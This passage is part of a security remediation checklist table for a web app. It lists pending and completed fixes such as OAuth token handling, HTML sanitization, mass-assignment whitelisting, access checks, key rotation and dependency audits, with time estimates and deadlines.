| 18 | Verify HTTPS is active after first deploy (I2) | 5 min | First deploy |
| 19 | Lock Atlas Network Access to static server IP (I1) | 30 min | First deploy |
| 20 | Add auth failure + AI call logging (MO2) | 1 hr | Before beta |
| 21 | Fix Google OAuth callback — token in URL (C3) | 2–4 hrs | Google OAuth live |
| 22 | Fix `googleLink` — verify `googleId` server-side (C4) | 1–2 hrs | Google OAuth live |
| 23 | ~~Fix Google OAuth username collision crash (M2)~~ ✅ March 17, 2026 | — | — |
| 24 | ~~Sanitize HTML note content — `sanitize-html` (M3)~~ ✅ March 17, 2026 | — | — |
| 25 | ~~Whitelist sync endpoint fields — prevent mass assignment (M4)~~ ✅ March 17, 2026 | — | — |
| 26 | ~~Add access check to `getComments` (M5)~~ ✅ March 17, 2026 | — | — |
| 27 | ~~Require accepted friendship before `startConversation` (M6)~~ ✅ March 17, 2026 | — | — |
| 28 | ~~Validate task participants are accepted friends (M7)~~ ✅ March 17, 2026 | — | — |
| 29 | ~~Implement email verification flow (L1)~~ ✅ March 17, 2026 | — | — |
| 30 | Encrypt Google OAuth tokens at rest (M8) | 2–3 hrs | Launch |
| 31 | Add hard delete endpoint for GDPR compliance (OP3) | 2–3 hrs | EU users |
| 32 | Run `npm audit` on every deploy (OP1) | Ongoing | Ongoing |
| 33 | Rotate all API keys on schedule (OP2) | 15 min | Quarterly |
| 34 | Keep `pdf-parse` updated (L2) | Ongoing | Ongoing |
